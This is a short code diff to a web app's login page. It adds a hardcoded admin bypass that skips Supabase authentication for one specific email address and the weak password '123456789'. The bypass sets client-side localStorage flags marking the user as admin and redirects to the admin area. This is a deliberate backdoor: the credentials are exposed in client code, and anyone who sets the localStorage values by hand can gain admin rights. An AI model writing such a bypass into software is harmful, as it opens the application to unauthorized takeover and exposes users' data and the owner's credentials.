@@ -38,6 +38,17 @@ export default function LoginPage() {
         setLoading(true);
         setError(null);
 
+        // Special Admin Bypass Check
+        if (formData.email === 'ashurajs558@gmail.com' && formData.password === '123456789') {
+            if (typeof window !== 'undefined') {
+                localStorage.setItem('admin_bypass', 'true');
+                localStorage.setItem('user_role', 'admin');
+            }
+            router.push('/admin');
+            setLoading(false);
+            return;
+        }
+
         try {
             const { data, error: signInError } = await supabase.auth.signInWithPassword({
                 email: formData.email,
